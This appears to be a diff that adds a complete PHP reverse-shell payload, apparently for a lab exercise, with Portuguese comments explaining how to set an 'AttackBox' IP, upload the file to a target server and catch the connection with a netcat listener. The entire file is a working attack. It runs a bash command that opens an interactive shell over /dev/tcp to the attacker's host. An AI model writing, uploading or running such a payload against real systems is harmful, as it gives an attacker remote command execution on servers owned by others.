@@ -1,0 +1,10 @@
+<?php
+// Reverse Shell PHP
+// Uso: Configure o IP e porta do seu listener, faça upload, e acesse via navegador
+// Listener: nc -lvnp 4444
+
+$ip = 'SEU_IP_AQUI';  // Substitua pelo IP do seu AttackBox
+$port = 4444;          // Porta do listener
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
+?>
